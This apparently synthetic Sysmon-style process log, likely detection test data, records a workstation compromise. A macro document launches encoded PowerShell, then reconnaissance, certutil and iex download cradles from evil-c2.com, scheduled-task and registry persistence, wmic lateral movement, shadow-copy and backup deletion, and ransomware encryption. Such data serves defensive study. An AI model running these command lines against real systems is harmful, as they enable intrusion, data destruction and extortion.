UtcTime,ProcessId,ParentProcessId,Image,ParentImage,CommandLine,User,Computer,ProcessGuid,ParentProcessGuid,IntegrityLevel,EventID
2024-11-15 08:00:01,4,0,System,,System,NT AUTHORITY\SYSTEM,WORKSTATION01,{00000001-0001-0001-0001-000000000001},{00000000-0000-0000-0000-000000000000},System,1
2024-11-15 08:00:02,612,4,C:\Windows\System32\smss.exe,System,\SystemRoot\System32\smss.exe,NT AUTHORITY\SYSTEM,WORKSTATION01,{00000001-0001-0001-0001-000000000002},{00000001-0001-0001-0001-000000000001},System,1
2024-11-15 08:00:05,688,612,C:\Windows\System32\csrss.exe,C:\Windows\System32\smss.exe,%SystemRoot%\system32\csrss.exe,NT AUTHORITY\SYSTEM,WORKSTATION01,{00000001-0001-0001-0001-000000000003},{00000001-0001-0001-0001-000000000002},System,1
2024-11-15 08:00:06,756,612,C:\Windows\System32\wininit.exe,C:\Windows\System32\smss.exe,wininit.exe,NT AUTHORITY\SYSTEM,WORKSTATION01,{00000001-0001-0001-0001-000000000004},{00000001-0001-0001-0001-000000000002},System,1
2024-11-15 08:00:10,812,756,C:\Windows\System32\services.exe,C:\Windows\System32\wininit.exe,C:\Windows\system32\services.exe,NT AUTHORITY\SYSTEM,WORKSTATION01,{00000001-0001-0001-0001-000000000005},{00000001-0001-0001-0001-000000000004},System,1
2024-11-15 08:00:11,824,756,C:\Windows\System32\lsass.exe,C:\Windows\System32\wininit.exe,C:\Windows\system32\lsass.exe,NT AUTHORITY\SYSTEM,WORKSTATION01,{00000001-0001-0001-0001-000000000006},{00000001-0001-0001-0001-000000000004},System,1
2024-11-15 08:01:00,2340,812,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,C:\Windows\system32\svchost.exe -k netsvcs -p,NT AUTHORITY\SYSTEM,WORKSTATION01,{00000001-0001-0001-0001-000000000010},{00000001-0001-0001-0001-000000000005},System,1
2024-11-15 08:01:05,2456,812,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted -p,NT AUTHORITY\LOCAL SERVICE,WORKSTATION01,{00000001-0001-0001-0001-000000000011},{00000001-0001-0001-0001-000000000005},System,1
2024-11-15 08:05:00,3100,2340,C:\Windows\explorer.exe,C:\Windows\System32\svchost.exe,C:\Windows\explorer.exe,CORP\jsmith,WORKSTATION01,{00000001-0001-0001-0001-000000000020},{00000001-0001-0001-0001-000000000010},High,1
2024-11-15 08:05:30,3200,3100,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,"C:\Program Files\Google\Chrome\Application\chrome.exe" --profile-directory="Default",CORP\jsmith,WORKSTATION01,{00000001-0001-0001-0001-000000000021},{00000001-0001-0001-0001-000000000020},Medium,1
2024-11-15 08:05:31,3204,3200,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,"C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer,CORP\jsmith,WORKSTATION01,{00000001-0001-0001-0001-000000000022},{00000001-0001-0001-0001-000000000021},Low,1
2024-11-15 08:10:00,3400,3100,C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,C:\Windows\explorer.exe,"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" /n "C:\Users\jsmith\Downloads\Q3_Report.docm",CORP\jsmith,WORKSTATION01,{00000001-0001-0001-0001-000000000030},{00000001-0001-0001-0001-000000000020},Medium,1
2024-11-15 08:10:15,3512,3400,C:\Windows\System32\cmd.exe,C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,cmd.exe /c "powershell -nop -w hidden -enc JABjAGwAaQBlAG4AdAA=",CORP\jsmith,WORKSTATION01,{00000001-0001-0001-0001-000000000031},{00000001-0001-0001-0001-000000000030},Medium,1
2024-11-15 08:10:16,3580,3512,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\System32\cmd.exe,powershell -nop -w hidden -enc JABjAGwAaQBlAG4AdAA9AE4AZQB3AC0ATwBiAGoAZQBjAHQA,CORP\jsmith,WORKSTATION01,{00000001-0001-0001-0001-000000000032},{00000001-0001-0001-0001-000000000031},Medium,1
2024-11-15 08:10:20,3612,3580,C:\Windows\System32\whoami.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,whoami /all,CORP\jsmith,WORKSTATION01,{00000001-0001-0001-0001-000000000033},{00000001-0001-0001-0001-000000000032},Medium,1
2024-11-15 08:10:22,3620,3580,C:\Windows\System32\ipconfig.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,ipconfig /all,CORP\jsmith,WORKSTATION01,{00000001-0001-0001-0001-000000000034},{00000001-0001-0001-0001-000000000032},Medium,1
2024-11-15 08:10:25,3628,3580,C:\Windows\System32\net.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,net user /domain,CORP\jsmith,WORKSTATION01,{00000001-0001-0001-0001-000000000035},{00000001-0001-0001-0001-000000000032},Medium,1
2024-11-15 08:10:26,3636,3628,C:\Windows\System32\net1.exe,C:\Windows\System32\net.exe,C:\Windows\system32\net1 user /domain,CORP\jsmith,WORKSTATION01,{00000001-0001-0001-0001-000000000036},{00000001-0001-0001-0001-000000000035},Medium,1
2024-11-15 08:10:30,3650,3580,C:\Windows\System32\nltest.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,nltest /dclist:corp.local,CORP\jsmith,WORKSTATION01,{00000001-0001-0001-0001-000000000037},{00000001-0001-0001-0001-000000000032},Medium,1
2024-11-15 08:10:35,3660,3580,C:\Windows\System32\net.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,net group "Domain Admins" /domain,CORP\jsmith,WORKSTATION01,{00000001-0001-0001-0001-000000000038},{00000001-0001-0001-0001-000000000032},Medium,1
2024-11-15 08:10:36,3668,3660,C:\Windows\System32\net1.exe,C:\Windows\System32\net.exe,C:\Windows\system32\net1 group "Domain Admins" /domain,CORP\jsmith,WORKSTATION01,{00000001-0001-0001-0001-000000000039},{00000001-0001-0001-0001-000000000038},Medium,1
2024-11-15 08:12:00,3700,3580,C:\Windows\System32\certutil.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,certutil -urlcache -split -f http://evil-c2.com/beacon.exe C:\Users\jsmith\AppData\Local\Temp\svc.exe,CORP\jsmith,WORKSTATION01,{00000001-0001-0001-0001-000000000040},{00000001-0001-0001-0001-000000000032},Medium,1
2024-11-15 08:12:10,3720,3580,C:\Users\jsmith\AppData\Local\Temp\svc.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Users\jsmith\AppData\Local\Temp\svc.exe,CORP\jsmith,WORKSTATION01,{00000001-0001-0001-0001-000000000041},{00000001-0001-0001-0001-000000000032},Medium,1
2024-11-15 08:12:15,3740,3720,C:\Windows\System32\cmd.exe,C:\Users\jsmith\AppData\Local\Temp\svc.exe,cmd.exe /c schtasks /create /tn "WindowsUpdate" /tr "C:\Users\jsmith\AppData\Local\Temp\svc.exe" /sc onlogon /ru SYSTEM,CORP\jsmith,WORKSTATION01,{00000001-0001-0001-0001-000000000042},{00000001-0001-0001-0001-000000000041},Medium,1
2024-11-15 08:12:16,3748,3740,C:\Windows\System32\schtasks.exe,C:\Windows\System32\cmd.exe,schtasks /create /tn "WindowsUpdate" /tr "C:\Users\jsmith\AppData\Local\Temp\svc.exe" /sc onlogon /ru SYSTEM,CORP\jsmith,WORKSTATION01,{00000001-0001-0001-0001-000000000043},{00000001-0001-0001-0001-000000000042},Medium,1
2024-11-15 08:12:20,3760,3720,C:\Windows\System32\reg.exe,C:\Users\jsmith\AppData\Local\Temp\svc.exe,"reg.exe" add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v WindowsUpdate /t REG_SZ /d "C:\Users\jsmith\AppData\Local\Temp\svc.exe" /f,CORP\jsmith,WORKSTATION01,{00000001-0001-0001-0001-000000000044},{00000001-0001-0001-0001-000000000041},Medium,1
2024-11-15 08:15:00,3800,3720,C:\Windows\System32\cmd.exe,C:\Users\jsmith\AppData\Local\Temp\svc.exe,cmd.exe /c wmic /node:DC01 process call create "cmd /c powershell -enc JABjAD0...",CORP\jsmith,WORKSTATION01,{00000001-0001-0001-0001-000000000050},{00000001-0001-0001-0001-000000000041},Medium,1
2024-11-15 08:15:01,3808,3800,C:\Windows\System32\wbem\WMIC.exe,C:\Windows\System32\cmd.exe,wmic /node:DC01 process call create "cmd /c powershell -enc JABjAD0...",CORP\jsmith,WORKSTATION01,{00000001-0001-0001-0001-000000000051},{00000001-0001-0001-0001-000000000050},Medium,1
2024-11-15 08:15:10,3820,3720,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Users\jsmith\AppData\Local\Temp\svc.exe,"powershell.exe" -nop Invoke-Command -ComputerName FILESERVER01 -ScriptBlock { iex (iwr http://evil-c2.com/stage2.ps1) },CORP\jsmith,WORKSTATION01,{00000001-0001-0001-0001-000000000052},{00000001-0001-0001-0001-000000000041},Medium,1
2024-11-15 08:20:00,3900,3720,C:\Windows\System32\cmd.exe,C:\Users\jsmith\AppData\Local\Temp\svc.exe,cmd.exe /c vssadmin delete shadows /all /quiet,CORP\jsmith,WORKSTATION01,{00000001-0001-0001-0001-000000000060},{00000001-0001-0001-0001-000000000041},Medium,1
2024-11-15 08:20:01,3908,3900,C:\Windows\System32\vssadmin.exe,C:\Windows\System32\cmd.exe,vssadmin delete shadows /all /quiet,CORP\jsmith,WORKSTATION01,{00000001-0001-0001-0001-000000000061},{00000001-0001-0001-0001-000000000060},Medium,1
2024-11-15 08:20:05,3916,3720,C:\Windows\System32\bcdedit.exe,C:\Users\jsmith\AppData\Local\Temp\svc.exe,bcdedit /set {default} recoveryenabled No,CORP\jsmith,WORKSTATION01,{00000001-0001-0001-0001-000000000062},{00000001-0001-0001-0001-000000000041},Medium,1
2024-11-15 08:20:10,3920,3720,C:\Windows\System32\wbadmin.exe,C:\Users\jsmith\AppData\Local\Temp\svc.exe,wbadmin delete catalog -quiet,CORP\jsmith,WORKSTATION01,{00000001-0001-0001-0001-000000000063},{00000001-0001-0001-0001-000000000041},Medium,1
2024-11-15 08:20:15,3930,3720,C:\Users\jsmith\AppData\Local\Temp\crypt.exe,C:\Users\jsmith\AppData\Local\Temp\svc.exe,C:\Users\jsmith\AppData\Local\Temp\crypt.exe --encrypt --target C:\ --ext .locked,CORP\jsmith,WORKSTATION01,{00000001-0001-0001-0001-000000000064},{00000001-0001-0001-0001-000000000041},Medium,1
2024-11-15 08:22:00,3950,3720,C:\Windows\System32\cmd.exe,C:\Users\jsmith\AppData\Local\Temp\svc.exe,cmd.exe /c ping -n 3 10.0.0.50 && copy \\FILESERVER01\share\data.xlsx C:\staging\,CORP\jsmith,WORKSTATION01,{00000001-0001-0001-0001-000000000070},{00000001-0001-0001-0001-000000000041},Medium,1
2024-11-15 08:22:05,3958,3950,C:\Windows\System32\PING.EXE,C:\Windows\System32\cmd.exe,ping -n 3 10.0.0.50,CORP\jsmith,WORKSTATION01,{00000001-0001-0001-0001-000000000071},{00000001-0001-0001-0001-000000000070},Medium,1
2024-11-15 08:25:00,4000,3720,C:\Windows\System32\rundll32.exe,C:\Users\jsmith\AppData\Local\Temp\svc.exe,"C:\Windows\System32\rundll32.exe" C:\Users\jsmith\AppData\Local\Temp\payload.dll,CORP\jsmith,WORKSTATION01,{00000001-0001-0001-0001-000000000080},{00000001-0001-0001-0001-000000000041},Medium,1
2024-11-15 08:25:05,4010,4000,C:\Windows\System32\mshta.exe,C:\Windows\System32\rundll32.exe,mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""powershell -nop -w hidden -c iex((New-Object Net.WebClient).DownloadString('http://evil-c2.com/update'))"":close"),CORP\jsmith,WORKSTATION01,{00000001-0001-0001-0001-000000000081},{00000001-0001-0001-0001-000000000080},Medium,1
